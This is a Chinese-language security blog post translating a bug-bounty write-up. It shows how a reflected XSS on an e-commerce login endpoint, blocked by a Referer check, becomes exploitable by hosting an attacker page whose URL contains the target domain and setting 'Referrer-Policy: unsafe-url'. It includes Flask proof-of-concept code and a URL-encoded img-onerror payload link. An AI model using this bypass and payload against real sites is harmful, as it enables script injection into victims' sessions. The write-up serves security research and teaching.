> **原文链接**: https://mp.weixin.qq.com/s?__biz=MjM5Mzc4MzUzMQ==&mid=2650261436&idx=1&sn=2550e6e55f35e52f5dc81402a77ab724

#  化腐朽为神奇：将 Self-XSS 升级为真正可利用的 XSS 漏洞  
原创 骨哥说事  骨哥说事   2025-07-21 07:09  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4549  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
# 巧妙绕过 Referer 来源验证  
  
在对一个电商网站进行安全测试时，白帽小哥发现了一处接口，它会将用户传入的参数值，未经任何处理就直接显示在返回的页面内容中。  
  
具体来说，就在 
```
/ajax/popup_login_bootstrap.php
```

  
 这个接口中，通过 
```
source_url
```

  
 参数发现了一处反射型 XSS (跨站脚本攻击)  漏洞。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve85R3gsaibiaNcBCOTibakoblvukiawKuVl1YHQDuJkhhFPuGXM6ocxAmYBA/640?wx_fmt=png&from=appmsg "")  
  
  
从上图可以清楚地看到，
```
source_url
```

  
 参数的值被原封不动地呈现在了响应页面里。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8xkGrS4lKXrxaoqybSOSt4aQIicvHkh2mbLymdDW05H6rian8ic0VELvtA/640?wx_fmt=png&from=appmsg "")  
  
  
当尝试将请求的 
```
Referer
```

  
 头从合法的 
```
www.target.co.uk
```

  
 修改为 
```
www.target.couk
```

  
 时，服务器返回了 
```
403 Forbidden
```

  
 错误，拒绝了请求。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8LlmdYLfQo9oSKNWu3goYGveTBLv8L0ibrAlkQCxBqr1VQw6UiceWjNEQ/640?wx_fmt=png&from=appmsg "")  
  
  
这说明服务器后台正在检查 
```
Referer
```

  
 头部，要求其中必须包含 
```
www.target.co.uk
```

  
 字符串。  
  
在目前这种情况下，这最多算是一个 Self-XSS 漏洞，也就是说，我们只能对自己执行 XSS 攻击，无法影响到其它用户。  
  
那么，我们该如何将其升级成一个真正有威胁的漏洞呢？  
# Self-XSS 的华丽变身  
  
要完成整个攻击链，白帽小哥采取了以下几个步骤：  
1. 搭建一个 Python Flask 服务器，用它来托管一个我们精心构造的恶意页面。这个页面的 URL 设置为 
```
evil.com/target.co.uk/exploit.html
```

  
。这样做是为了让 URL 中包含 
```
target.co.uk
```

  
 字符串，从而满足服务器对 
```
Referer
```

  
 的验证规则  
  
1. **关键一步**  
：在我们搭建的“恶意服务器”上，设置一个特殊的 HTTP 响应头：
```
Referrer-Policy: unsafe-url
```

  
，这个设置能确保当用户从我们的恶意页面跳转时，浏览器会在 
```
Referer
```

  
 头部发送完整的、未经删减的 URL  
  
1. 诱导用户访问我们的恶意页面，一旦用户点击页面上的链接，他们就会被自动重定向到目标网站存在漏洞的接口，从而成功触发 XSS 攻击  
  
## 解读 Referrer-Policy 响应头  
  
HTTP 的 
```
Referrer-Policy
```

  
 响应头，是用来控制浏览器在跨域请求时，应该在 
```
Referer
```

  
 头部中包含多少引荐来源信息的策略。  
  
它可以被设置为多种不同的值，例如：  
- Referrer-Policy: no-referrer  
  
- Referrer-Policy: no-referrer-when-downgrade  
  
- Referrer-Policy: origin  
  
- Referrer-Policy: origin-when-cross-origin  
  
- Referrer-Policy: same-origin  
  
- Referrer-Policy: strict-origin  
  
- Referrer-Policy: strict-origin-when-cross-origin  
  
- Referrer-Policy: unsafe-url  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8kic3pMxcrZmK4BwWCVtibvmwvhqicAcLeoPthiccw7Q3EQXNA3PXAktjvw/640?wx_fmt=png&from=appmsg "")  
  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8RxgkeVCLpwIaXVc0EnS3CUqzhXYpOcuTzriaMSO8R75HbMQPOHBAcVA/640?wx_fmt=png&from=appmsg "")  
  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8lA6JBlbHiaGiaUBIDQwG94rMfLiaCBK9p7Z7gVVffh5EVzo3hSqkG8WdA/640?wx_fmt=png&from=appmsg "")  
  
  
在我们的攻击场景中，目标是让 
```
Referer
```

  
 头部完整地包含我们的恶意 URL (
```
evil.com/target.co.uk/exploit.html
```

  
)，因此，我们必须选择 
```
unsafe-url
```

  
 这个策略。  
## PoC (概念验证) 代码  
  
使用下面这段简单的 Flask 代码快速搭建了恶意服务器：  

```
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import parse_qs, urlencode
from flask import Flask, make_response, jsonify, request, render_template
from flask_cors import CORS
from flask import Flask, render_template

app = Flask(__name__)

# 为两个不同的路径注册同一个处理函数
@app.route('/')
@app.route('/target.co.uk/evil.html')
def index():
    # 渲染 xss.html 模板文件
    response = make_response(render_template('xss.html', the_title='XSS POC'))
    # 设置关键的响应头
    response.headers[&#34;Referrer-Policy&#34;] = 'unsafe-url'
    return response


```

  
这段代码的作用是，当用户访问 
```
/target.co.uk/evil.html
```

  
 这个路径时，服务器会返回 
```
xss.html
```

  
 页面的内容。  
  
而 
```
xss.html
```

  
 文件中则包含了真正的攻击链接：  

```
<a href=&#34;https://www.target.co.uk/ajax/popup_login_bootstrap.php?source_url=%27%22%3e%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%64%6f%6d%61%69%6e%29%20%2f%3e&#34;>点我触发攻击</a>

```

  
为了让这个攻击能够在互联网上被访问到，可以使用 
```
ngrok
```

  
 工具，将本地的恶意服务器暴露在公网上。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8W23s61ImJ5beJZzAWIsogTicxVEtTaldqtRdmdbyMlYImwCNjGudLIw/640?wx_fmt=png&from=appmsg "")  
  
  
从上图可以看到，我们服务器的响应头中，
```
Referrer-Policy
```

  
 确实已经被设置为了 
```
unsafe-url
```

  
。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8DmEibLEaSOHpRQVylV7qBL9b8jTzTYqG6LWY5xpG9CIdZFEb4Zjribibw/640?wx_fmt=png&from=appmsg "")  
  
  
当受害者点击我们页面上的链接时，浏览器会将完整的 
```
Referer
```

  
 头部 (
```
evil.com/target.co.uk/evil.html
```

  
) 发送到目标服务器。  
  
由于这个 URL 满足了其正则表达式的检查规则，服务器返回了 
```
200 OK
```

  
 的正常响应。  
  
最终，我们的 XSS 攻击载荷 (payload) 被未经任何编码地插入到返回页面中，成功执行！  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jnaibpiaylNsblwKMiamejsve8ib733ad2VdUPbeNBN2xzk5qspOdGJvrt3OryKQNsMjQvr3ohpBLb2wg/640?wx_fmt=png&from=appmsg "")  
  
  
你学到了么？  
  
原文：https://infosecwriteups.com/transforming-self-xss-to-exploitable-xss-part-1-9f2d0f94f807  
  
- END -  
  
****  
**加入星球，随时交流：**  
  
**********（会员统一定价）：128元/年（0.35元/天）******  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～**  
  
